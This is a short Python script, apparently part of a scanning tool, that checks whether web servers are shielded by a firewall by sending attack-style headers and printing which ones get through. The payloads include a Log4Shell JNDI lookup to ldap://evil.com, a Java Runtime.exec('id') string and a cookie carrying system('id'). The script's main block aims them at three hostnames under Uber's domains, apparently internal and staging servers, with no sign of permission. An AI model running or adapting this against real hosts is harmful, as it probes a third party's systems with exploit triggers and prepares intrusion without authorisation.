import asyncio
import httpx
from aura.ui.formatter import console

async def check_waf_shielding(url):
    """
    Sends 'characteristic' but non-destructive payloads to detect WAF/Shielding.
    If 'id' or 'Runtime' are blocked, the target is likely shielded.
    """
    payloads = [
        {"X-Scan": "java.lang.Runtime.getRuntime().exec('id')"},
        {"User-Agent": "${jndi:ldap://evil.com/a}"},
        {"Cookie": "admin=true; path=/; system('id')"}
    ]
    
    console.print(f"[*] Auditing WAF status for {url}...")
    try:
        async with httpx.AsyncClient(verify=False, timeout=5) as client:
            # Baseline
            r_base = await client.get(url)
            console.print(f"  [.] Baseline: {r_base.status_code}")
            
            for p in payloads:
                try:
                    r = await client.get(url, headers=p)
                    if r.status_code == 403 or r.status_code == 406:
                        console.print(f"  [red][WAF] SHIELDED -> {list(p.keys())[0]} payload blocked ({r.status_code})[/red]")
                    elif r.status_code == r_base.status_code:
                        console.print(f"  [green][OPEN] PASSED -> {list(p.keys())[0]} payload reached the application[/green]")
                    else:
                        console.print(f"  [yellow][?] UNKNOWN -> Code {r.status_code}[/yellow]")
                except: continue
    except Exception as e:
        console.print(f"  [red]Audit failed: {e}[/red]")

if __name__ == "__main__":
    targets = [
        "https://chef.uberinternal.com",
        "https://staging-pilot.ucollect.uber.com",
        "https://devbuilds.uber.com"
    ]
    loop = asyncio.get_event_loop()
    for t in targets:
        loop.run_until_complete(check_waf_shielding(t))
